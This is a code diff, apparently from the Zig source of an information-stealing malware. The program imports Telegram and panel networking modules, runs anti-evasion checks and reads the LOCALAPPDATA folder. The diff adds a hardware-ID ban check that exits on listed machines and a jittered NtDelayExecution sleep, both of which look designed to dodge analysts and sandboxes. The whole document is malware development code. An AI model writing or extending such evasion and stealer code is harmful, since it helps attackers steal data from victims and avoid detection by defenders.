@@ -31,6 +31,7 @@ const gaming_mod = @import("gaming/gaming.zig");
 const zip_mod = @import("network/zip.zig");
 const telegram_net = @import("network/telegram.zig");
 const panel_http = @import("network/panel_http.zig");
+const detection = @import("evasion/detection.zig");
 
 const is_debug = true;
 
@@ -323,6 +324,22 @@ fn runProductionPipeline() void {
     const env_ok = initAntiEvasion(ntdll);
     if (!env_ok) return;
     logMsg("[+] Anti-evasion checks passed\n");
+
+    if (config.HWID_BAN_LIST.len > 0) {
+        const hwid = detection.generateHwid();
+        if (hwid) |h| {
+            for (config.HWID_BAN_LIST) |banned| {
+                if (std.mem.eql(u8, &h, banned)) {
+                    logMsg("[!] HWID is banned, exiting\n");
+                    return;
+                }
+            }
+        }
+    }
+
+    const sleep_ms = config.SLEEP_MIN_MS + @as(u64, @intCast(@mod(@as(u32, @truncate(@as(usize, @intFromPtr(&ntdll)))), 100))) * config.SLEEP_JITTER_MS / 100;
+    var interval: types.LARGE_INTEGER = -@as(types.LARGE_INTEGER, @intCast(sleep_ms * 10000));
+    _ = engine.NtDelayExecution(0, &interval);
 
     const local_app_data = getEnvVar("LOCALAPPDATA", allocator) orelse {
         logMsg("[!] LOCALAPPDATA not found\n");
